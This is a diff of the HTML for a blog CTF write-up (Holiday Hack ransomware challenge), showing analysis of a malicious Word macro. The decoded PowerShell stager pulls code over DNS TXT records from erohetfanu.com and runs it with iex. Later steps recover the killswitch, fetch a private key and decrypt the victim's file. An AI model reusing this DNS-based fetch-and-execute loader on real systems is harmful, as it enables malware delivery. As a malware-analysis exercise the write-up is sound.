 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb>olevba 0.53.1 <span style=color:#719e07>-</span> http:<span style=color:#719e07>//</span>decalage.info<span style=color:#719e07>/</span>python<span style=color:#719e07>/</span>oletools
@@ -1632,13 +1682,13 @@ Shell cmd
 | Suspicious | <span style=color:#719e07>New</span><span style=color:#719e07>-</span><span style=color:#dc322f>Object</span>      | May create an OLE <span style=color:#dc322f>object</span> <span style=color:#719e07>using</span>          |
 |            |                 | PowerShell                              |
 | IOC        | powershell.exe  | Executable file name                    |
-<span style=color:#719e07>+------------+-----------------+-----------------------------------------+</span></code></pre></div>
-<p>Seems like the Powershell payload is base64 encoded and then compressed.</p>
+<span style=color:#719e07>+------------+-----------------+-----------------------------------------+</span>
+</code></pre></div><p>Seems like the Powershell payload is base64 encoded and then compressed.</p>
 <p>Cyberchef to the rescuce.</p>
-<pre tabindex=0><code>From_Base64(&#39;A-Za-z0-9+/=&#39;,true)
-Raw_Inflate(0,0,&#39;Adaptive&#39;,false,false)
-Generic_Code_Beautify()</code></pre>
-<p>And we get</p>
+<pre tabindex=0><code>From_Base64('A-Za-z0-9+/=',true)
+Raw_Inflate(0,0,'Adaptive',false,false)
+Generic_Code_Beautify()
+</code></pre><p>And we get</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#719e07>function</span> H2A(<span style=color:#268bd2>$a</span>) {
     <span style=color:#268bd2>$o</span>;
     <span style=color:#268bd2>$a</span>  - split <span style=color:#2aa198>&#39;(..)&#39;</span> | ? {
@@ -1659,19 +1709,21 @@ Generic_Code_Beautify()</code></pre>
 <span style=color:#719e07>foreach</span> (<span style=color:#268bd2>$i</span> <span style=color:#719e07>in</span> 0..(<span style=color:#cb4b16>[convert]</span>::ToInt32((Resolve - DnsName  - Server erohetfanu.com  - Name <span style=color:#2aa198>&#34;$f.erohetfanu.com&#34;</span>  - <span style=color:#b58900>Type </span>TXT).strings, 10) - 1)) {
     <span style=color:#268bd2>$h</span> += (Resolve - DnsName  - Server erohetfanu.com  - Name <span style=color:#2aa198>&#34;$i.$f.erohetfanu.com&#34;</span>  - <span style=color:#b58900>Type </span>TXT).strings
 };
-iex($(H2A <span style=color:#268bd2>$h</span> | Out - string))</code></pre></div>
-<h2 id=9-3-stop-the-malware>9.3 Stop the Malware</h2>
-<pre tabindex=0><code>Erohetfanu.com, I wonder what that means? Unfortunately, Snort alerts show multiple domains, so blocking that one won&#39;t be effective.
+iex($(H2A <span style=color:#268bd2>$h</span> | Out - string))
+</code></pre></div>
+<h2 id=93-stop-the-malware>9.3 Stop the Malware
+<a class=header-link href=#93-stop-the-malware><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><pre tabindex=0><code>Erohetfanu.com, I wonder what that means? Unfortunately, Snort alerts show multiple domains, so blocking that one won't be effective.
 
-I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.</code></pre>
-<p>Now we need to find the killswitch.</p>
+I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.
+</code></pre><p>Now we need to find the killswitch.</p>
 <p>To get the output of the malware, change the last line to just print the code instead of executing it with <code>iex</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>H2A <span style=color:#268bd2>$h</span> | Out - string</code></pre></div>
-<p>Run the ps1 file and direct the output to a new file. And it works.</p>
-<pre tabindex=0><code>(Get-WmiObject Win32_ComputerSystem).Domain -ne &#34;KRINGLECASTLE&#34;)</code></pre>
-<p>to</p>
-<pre tabindex=0><code>(Get-WmiObject Win32_ComputerSystem).Domain -eq &#34;KRINGLECASTLE&#34;)</code></pre>
-<p><code>H2A</code> (Hex to ASCII)</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>H2A <span style=color:#268bd2>$h</span> | Out - string
+</code></pre></div><p>Run the ps1 file and direct the output to a new file. And it works.</p>
+<pre tabindex=0><code>(Get-WmiObject Win32_ComputerSystem).Domain -ne &quot;KRINGLECASTLE&quot;)
+</code></pre><p>to</p>
+<pre tabindex=0><code>(Get-WmiObject Win32_ComputerSystem).Domain -eq &quot;KRINGLECASTLE&quot;)
+</code></pre><p><code>H2A</code> (Hex to ASCII)</p>
 <p><code>server.crt</code></p>
 <pre tabindex=0><code>MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
 BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
@@ -1691,8 +1743,8 @@ QS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKO
 xOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7
 MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV
 oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
-+w==</code></pre>
-<p>The other file is 6754 chunks</p>
++w==
+</code></pre><p>The other file is 6754 chunks</p>
 <p>From</p>
 <p>0.736F757263652E6D696E2E68746D6C.erohetfanu.com: type TXT, class IN</p>
 <p>to</p>
@@ -1710,21 +1762,22 @@ oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
     <span style=color:#268bd2>$S1</span> = <span style=color:#2aa198>&#34;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&#34;</span>
     <span style=color:#719e07>if</span> (<span style=color:#268bd2>$null</span> <span style=color:#719e07>-ne</span> ((<span style=color:#b58900>Resolve-DnsName</span> -Name $(HexToASCII $(ByteToHex $(XOR $(ByteToHex $(GzipToBytes $(HexToByte <span style=color:#268bd2>$S1</span>))) $(<span style=color:#b58900>Resolve-DnsName</span> -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
         <span style=color:#719e07>return</span> 
-    }</code></pre></div>
-<p>Is this the killswitch? Yes it is.</p>
+    }
+</code></pre></div><p>Is this the killswitch? Yes it is.</p>
 <p>We can print the result.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#719e07>function</span> wanc {
     <span style=color:#268bd2>$S1</span> = <span style=color:#2aa198>&#34;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&#34;</span>
 
     $(HexToASCII $(ByteToHex $(XOR $(ByteToHex $(GzipToBytes $(HexToByte <span style=color:#268bd2>$S1</span>))) $(<span style=color:#b58900>Resolve-DnsName</span> -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))) | <span style=color:#b58900>Out-String</span>
     <span style=color:#719e07>return</span>
-    ...</code></pre></div>
-<p>And we have the killswitch - answer is <code>yippeekiyaa.aaay</code>.</p>
+    ...
+</code></pre></div><p>And we have the killswitch - answer is <code>yippeekiyaa.aaay</code>.</p>
 <pre tabindex=0><code>$ .\output-cyberchef.ps1
-yippeekiyaa.aaay</code></pre>
-<hr>
-<h2 id=9-4-recover-alabaster-s-password>9.4 Recover Alabaster's Password</h2>
-<p>Now we have a memory dump and a file and we need to recover the key.</p>
+yippeekiyaa.aaay
+</code></pre><hr>
+<h2 id=94-recover-alabasters-password>9.4 Recover Alabaster's Password
+<a class=header-link href=#94-recover-alabasters-password><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Now we have a memory dump and a file and we need to recover the key.</p>
 <p>Use power dump to process the memory file.</p>
 <p>Then look for variables.</p>
 <p><code>matches "^[a-fA-F0-9]+$"</code>
@@ -1738,11 +1791,11 @@ cf522b78d86c486691226b40aa69e95c
 
 4ec4f0187cb04f4cb6973460dfe252df
 
-27c87ef9bbda4f709f6b4002fa4af63c</code></pre>
-<p>Let's see if we can also find the hash. The length is 40 in this case.</p>
+27c87ef9bbda4f709f6b4002fa4af63c
+</code></pre><p>Let's see if we can also find the hash. The length is 40 in this case.</p>
 <p>We get one match with <code>len == 40</code>.</p>
-<pre tabindex=0><code>b0e59a5e0f00968856f22cff2d6226697535da5b</code></pre>
-<p>This should be hash of one of the above. But it matches none of our keys. So either our keys are wrong or something else.</p>
+<pre tabindex=0><code>b0e59a5e0f00968856f22cff2d6226697535da5b
+</code></pre><p>This should be hash of one of the above. But it matches none of our keys. So either our keys are wrong or something else.</p>
 <p>Google doesn't give me anything either, so it's not the SHA-1 hash of something good.</p>
 <p>Let's search for powershell scripts in the dump and it finds 65. We are looking for something that does encryption, so we search for <code>matches ".*System.Security.Cryptography.*"</code> (do we even need the <code>.*</code>?).</p>
 <p>And we find one script. DUMP it and it's our original script. Hmm.</p>
@@ -1807,11 +1860,11 @@ Extensions
   authorityKeyIdentifier :
     kid=7de3a06787fe931535fc137f3e91d1bb3058cdd1
   basicConstraints :
-    cA=true</code></pre>
-<p>Key size is <code>2048</code> bits, or <code>256</code> bytes, so let's see if we can find a key in the dump of size <code>512</code> (remember they are hex encoded most likely).</p>
+    cA=true
+</code></pre><p>Key size is <code>2048</code> bits, or <code>256</code> bytes, so let's see if we can find a key in the dump of size <code>512</code> (remember they are hex encoded most likely).</p>
 <p>woot?</p>
 <pre tabindex=0><code>================ Filters ================
-1| MATCHES  bool(re.search(r&#34;^[a-fA-F0-9]+$&#34;,variable_values))
+1| MATCHES  bool(re.search(r&quot;^[a-fA-F0-9]+$&quot;,variable_values))
 2| LENGTH  len(variable_values) == 512
 
 [i] 1 powershell Variable Values found!
@@ -1821,13 +1874,13 @@ COMMAND        |     ARGUMENT                | Explanation
 print          | print [all|num]             | print specific or all Variables
 dump           | dump [all|num]              | dump specific or all Variables
 contains       | contains [ascii_string]     | Variable Values must contain string
-matches        | matches &#34;[python_regex]&#34;    | match python regex inside quotes
+matches        | matches &quot;[python_regex]&quot;    | match python regex inside quotes
 len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size
 clear          | clear [all|num]             | clear all or specific filter num
 ===============================================================================
 : print
-3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</code></pre>
-<p>Assuming this is the certificate's private key, we should be able to test our hypothesis? Or maybe it's the public key?</p>
+3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
+</code></pre><p>Assuming this is the certificate's private key, we should be able to test our hypothesis? Or maybe it's the public key?</p>
 <p>So to get the private key we need to look at the files that are called with <code>GetOverDNS</code> or <code>g_o_dns</code>. We are requesting <code>server.crt</code> and then <code>source.min.html</code>. Remember from previosu challenge where we had the two files in the source? What if we call the same function but ask for <code>server.key</code>.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#586e75># modified function.</span>
 <span style=color:#719e07>function</span> GetOverDNS (<span style=color:#268bd2>$f</span>) {
@@ -1841,27 +1894,27 @@ clear          | clear [all|num]             | clear all or specific filter num
     (HexToASCII <span style=color:#268bd2>$h</span>) | <span style=color:#b58900>Out-String</span> | <span style=color:#b58900>Out-File</span> -FilePath (HexToASCII <span style=color:#268bd2>$f</span> | <span style=color:#b58900>Out-String</span>).Trim()
     <span style=color:#b58900>Write-Host</span> <span style=color:#2aa198>&#34;Return from GetOverDNS&#34;</span>
     <span style=color:#719e07>return</span> (HexToASCII <span style=color:#268bd2>$h</span>) 
-}</code></pre></div>
-<p>Create pkcs12/pfx file form cert and key with <code>certutil</code></p>
+}
+</code></pre></div><p>Create pkcs12/pfx file form cert and key with <code>certutil</code></p>
 <pre tabindex=0><code>$ certutil.exe -MergePFX .\server.crt server.pfx
 Signature test passed
 Enter new password for output file server.pfx:
 Enter new password:
 Confirm new password:
-CertUtil: -MergePFX command completed successfully.</code></pre>
-<p>To convert unicode files to ascii (server cert and key are both UTF-16?), we can use powershell.</p>
-<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#b58900>Get-Content</span> .\server.key | <span style=color:#b58900>Out-File</span> -Encoding ASCII <span style=color:#b58900>server-ascii</span>.key</code></pre></div>
-<p>Then convert both of them to PFX together</p>
+CertUtil: -MergePFX command completed successfully.
+</code></pre><p>To convert unicode files to ascii (server cert and key are both UTF-16?), we can use powershell.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#b58900>Get-Content</span> .\server.key | <span style=color:#b58900>Out-File</span> -Encoding ASCII <span style=color:#b58900>server-ascii</span>.key
+</code></pre></div><p>Then convert both of them to PFX together</p>
 <pre tabindex=0><code>openssl.exe pkcs12 -export -out server.pfx -inkey server-ascii.key -in server-ascii.crt
-WARNING: can&#39;t open config file: /usr/local/ssl/openssl.cnf
+WARNING: can't open config file: /usr/local/ssl/openssl.cnf
 Enter Export Password:
 Verifying - Enter Export Password:
-unable to write &#39;random state&#39;</code></pre>
-<p>openssl pkeyutl --Help</p>
+unable to write 'random state'
+</code></pre><p>openssl pkeyutl --Help</p>
 <p>It's OAEP.</p>
 <pre tabindex=0><code>openssl pkeyutl -decrypt -inkey server-ascii.key -in encrypted -out decrypted -pkeyopt rsa_padding_mode:oaep
-WARNING: can&#39;t open config file: /usr/local/ssl/openssl.cnf</code></pre>
-<p>And it got decrypted.</p>
+WARNING: can't open config file: /usr/local/ssl/openssl.cnf
+</code></pre><p>And it got decrypted.</p>
 <p>Now we need to decrypt the password file with this AES key.</p>
 <p>Looking at the PowerShell script we can see it's using AES-CBC. But the first 16 bytes are not the IV.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#586e75># generate IV - 16 bytes</span>
@@ -1869,8 +1922,8 @@ WARNING: can&#39;t open config file: /usr/local/ssl/openssl.cnf</code></pre>
 <span style=color:#586e75># write length of IV (16 or 10 00 00 00) to file</span>
 <span style=color:#268bd2>$FileSW</span>.Write(<span style=color:#cb4b16>[System.BitConverter]</span>::GetBytes(<span style=color:#268bd2>$AESP</span>.IV.Length),0,4)
 <span style=color:#586e75># write IV to file</span>
-<span style=color:#268bd2>$FileSW</span>.Write(<span style=color:#268bd2>$AESP</span>.IV,0,<span style=color:#268bd2>$AESP</span>.IV.Length)</code></pre></div>
-<p>First four bytes are the length of IV which for AES are always <code>10 00 00 00</code>.</p>
+<span style=color:#268bd2>$FileSW</span>.Write(<span style=color:#268bd2>$AESP</span>.IV,0,<span style=color:#268bd2>$AESP</span>.IV.Length)
+</code></pre></div><p>First four bytes are the length of IV which for AES are always <code>10 00 00 00</code>.</p>
 <p>Then there is IV.</p>
 <p>During encryption, each 16 bytes are encrypted individually which does not make any difference in this case.</p>
 <p>FBCFC121915D99CC20A3D3D5D84F8308</p>
@@ -1905,11 +1958,12 @@ See what happens when they take off those hats?
 
 Based on your victory… next year, I’m going to ask for your help in defending my whole operation from evil bad guys.
 
-And welcome to my vault room. Where&#39;s my treasure? Well, my treasure is Christmas joy and good will.
+And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will.
 
 You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?
 
-They lived happily ever after.</code></pre>
+They lived happily ever after.
+</code></pre>
 </div>
 <footer>
 <p class=meta>
@@ -1933,16 +1987,19 @@ Tags:
 <li><a href=#objective-2>Objective 2</a></li>
 <li><a href=#lethal-forensicelfication>Lethal ForensicELFication</a></li>
 <li><a href=#door-passcode>Door Passcode</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href=#3-de-bruijn-sequences>3. de Bruijn Sequences</a></li>
 <li><a href=#4-data-repo-analysis>4. Data Repo Analysis</a>
 <ul>
 <li><a href=#stall-mucking-report>Stall Mucking Report</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href=#5-ad-privilege-discovery>5. AD Privilege Discovery</a>
 <ul>
 <li><a href=#curling-master>CURLing Master</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href=#now-the-vm>Now the VM</a></li>
 <li><a href=#6-badge-manipulation>6. Badge Manipulation</a>
 <ul>
@@ -1950,40 +2007,48 @@ Tags:
 <li><a href=#scan-o-matic>scan-o-matic</a>
 <ul>
 <li><a href=#payload>Payload</a></li>
-</ul></li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li><a href=#7-hr-incident-response>7. HR Incident Response</a>
 <ul>
 <li><a href=#dev-ops-fail>Dev Ops Fail</a></li>
-<li><a href=#https-careers-kringlecastle-com><a href=https://careers.kringlecastle.com/ rel=nofollow target=_blank>https://careers.kringlecastle.com/</a></a>
+<li><a href=#httpscareerskringlecastlecom><a href=https://careers.kringlecastle.com/>https://careers.kringlecastle.com/</a></a>
 <ul>
 <li><a href=#csv-injection-talk>CSV Injection Talk</a></li>
-</ul></li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li><a href=#8-network-traffic-forensics>8. Network Traffic Forensics</a>
 <ul>
 <li><a href=#python-escape-from>Python Escape from</a>
 <ul>
 <li><a href=#talk-notes>Talk Notes</a>
 <ul>
-<li><a href=#overwrite-reload-python-modules>Overwrite/Reload Python Modules</a></li>
+<li><a href=#overwritereload-python-modules>Overwrite/Reload Python Modules</a></li>
 <li><a href=#python-as-child-process>Python as Child Process</a></li>
 <li><a href=#exec>exec</a></li>
 <li><a href=#eval>eval</a></li>
 <li><a href=#compile>compile</a></li>
 <li><a href=#exec-eval-import-and-compile-are-blocked>exec, eval, import and compile are blocked</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href=#challenge>Challenge</a></li>
-</ul></li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li><a href=#9-ransomware-recovery>9. Ransomware Recovery</a>
 <ul>
 <li><a href=#the-sleighball>The Sleighball</a></li>
-<li><a href=#9-1-catch-the-malware>9.1 Catch the Malware</a></li>
-<li><a href=#9-2-identify-the-domain>9.2 Identify the Domain</a></li>
-<li><a href=#9-3-stop-the-malware>9.3 Stop the Malware</a></li>
-<li><a href=#9-4-recover-alabaster-s-password>9.4 Recover Alabaster's Password</a></li>
-</ul></li>
+<li><a href=#91-catch-the-malware>9.1 Catch the Malware</a></li>
+<li><a href=#92-identify-the-domain>9.2 Identify the Domain</a></li>
+<li><a href=#93-stop-the-malware>9.3 Stop the Malware</a></li>
+<li><a href=#94-recover-alabasters-password>9.4 Recover Alabaster's Password</a></li>
+</ul>
+</li>
 </ul>
 </nav>
 </section>
